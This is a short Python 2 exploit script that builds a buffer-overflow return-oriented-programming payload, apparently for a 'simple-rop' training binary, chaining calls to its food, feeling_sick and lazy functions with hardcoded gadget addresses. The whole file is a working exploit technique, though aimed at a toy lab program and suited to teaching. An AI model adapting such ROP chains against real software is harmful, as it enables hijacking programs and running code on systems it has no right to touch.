#!/usr/bin/env python
import os
import struct

#simple-rop.c
#Find gadgets
pop_ret = 0x080481c9 # start address of a pop,ret sequence
pop_pop_ret = 0x0804834b # start address of a pop,pop,ret sequence
lazy = 0x080488a5 # objdump -d | grep lazy
food = 0x080488d0 # objdump -d | grep food
feeling_sick = 0x08048932 # objdump -d | grep feeling_sick

#Buffer Overflow
payload = "A"*0x6c
payload += "BBBB"

#food(0xdeadbeef) gadget
payload += struct.pack("I", food)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xdeadbeef)

#feeling_sick(0xd15ea5e, 0x0badf00d) gadget
payload += struct.pack("I", feeling_sick)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", 0xd15ea5e)
payload += struct.pack("I", 0x0badf00d)

payload += struct.pack("I", lazy)

#os.system("./simple-rop \"%s\"" % payload)

print payload

